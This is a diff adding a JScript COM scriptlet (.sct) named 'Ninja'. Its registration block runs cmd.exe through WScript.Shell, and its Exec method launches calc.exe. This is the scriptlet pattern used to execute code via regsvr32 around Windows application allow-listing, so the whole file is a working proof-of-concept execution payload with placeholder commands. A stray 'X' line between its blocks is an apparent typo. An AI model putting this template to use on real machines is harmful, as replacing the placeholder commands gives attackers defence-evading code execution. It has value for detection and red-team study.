@@ -1,0 +1,30 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Ninja"
+    progid="Ninja"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    >   
+    <script language="JScript">
+        <![CDATA[
+    
+            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+    
+        ]]>
+    </script>
+</registration>
+X
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+    }
+]]>
+</script>
+</scriptlet>
